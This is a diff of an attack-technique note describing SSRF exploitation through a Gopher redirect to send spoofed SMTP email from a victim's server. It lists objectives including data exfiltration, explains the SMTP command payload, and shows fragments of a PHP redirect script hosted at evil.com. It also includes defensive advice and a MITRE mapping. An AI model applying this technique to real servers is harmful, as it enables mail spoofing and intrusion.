@@ -39,11 +39,15 @@ To execute this attack, an attacker must first identify a SSRF vulnerability in 
 
 Businesses should be aware of the potential for SSRF vulnerabilities in their servers and take steps to mitigate them. This includes implementing input validation and sanitization, restricting network access, and monitoring server logs for suspicious activity.
 
+ 
+
 ## Requirements
 
 1. Access to a server with a SSRF vulnerability
 
 1. Knowledge of the Gopher protocol and SMTP
+
+ 
 
 ## Defense
 
@@ -53,6 +57,8 @@ Businesses should be aware of the potential for SSRF vulnerabilities in their se
 
 1. Monitor server logs for suspicious activity
 
+ 
+
 ## Objectives
 
 1. Send email messages from a victim's server
@@ -61,15 +67,25 @@ Businesses should be aware of the potential for SSRF vulnerabilities in their se
 
 1. Exfiltrate sensitive information
 
+ 
+
 # Instructions
 
 1. This command sends a spoofed email to a specified email address using the victim's email address as the sender. The email contains a specific message and subject.
+
+ 
+
+
 
 **Code**: [[Content of evil.com/redirect.php:
 <?php
         $c]]
 
+
+
 > The commands array contains a list of SMTP commands that are used to send an email. The HELO command is used to identify the domain of the sender. The MAIL FROM command specifies the sender's email address. The RCPT TO command specifies the recipient's email address. The DATA command indicates the start of the email message. The Subject line specifies the email's subject. The message body is specified in the line 'Corben was here, woot woot!'. The final '.' command indicates the end of the email message. The payload is created by joining all the commands in the commands array with '%0A'. The header function is used to redirect the payload to the specified email server using the gopher protocol on port 25.
+
+
 
 **Command** ([[Create email payload and redirect victim to gopher protocol]]):
 
@@ -90,6 +106,8 @@ Businesses should be aware of the potential for SSRF vulnerabilities in their se
         header('Location: gopher://0:25/_'.$payload);
 ?>
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -115,3 +133,5 @@ Businesses should be aware of the potential for SSRF vulnerabilities in their se
 - [[Gopher SMTP - send a mail]]
 - [[Server-Side Request Forgery]]
 - [[SSRF exploitation via URL Scheme]]
+
+
